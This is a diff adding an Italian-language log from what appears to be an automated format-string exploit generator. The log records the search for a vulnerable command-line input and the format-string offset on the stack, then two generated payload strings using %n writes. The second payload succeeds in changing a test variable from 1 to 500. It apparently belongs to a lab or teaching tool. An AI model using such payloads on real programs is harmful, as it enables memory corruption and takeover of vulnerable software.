@@ -1,0 +1,28 @@
+Dimensione indirizzi: 4 byte
+Endian: little
+
+Input da linea di comando: [{'type': 'command_line_input', 'value': 'PPPP', 'free': True}]
+Input da passare durante l'esecuzione: []
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'command_line_input', 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (11 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: px, yu
+Conteggio della dimensione effettiva dell'input (fino a 515 caratteri): 58 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: posizione 5
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': generazione completata con successo
+La stringa generata è: 
+		b'%500x%08$ln.\\\xce\xff\xffCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCpxyu'
+Inizio exploit: segmentation fault incontrato tentando l'exploit 
+Passaggo alla generazione della stringa nel formato 'indirizzi-scrittori': generazione completata con successo
+La stringa generata è: 
+		b'\\\xce\xff\xff%496x%05$lnCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCpxyu'
+Inizio exploit: La risposta è:
+----------------------------------------
+0xffffce5c
+Change i's value from 1 -> 500. GOOD
+
+----------------------------------------
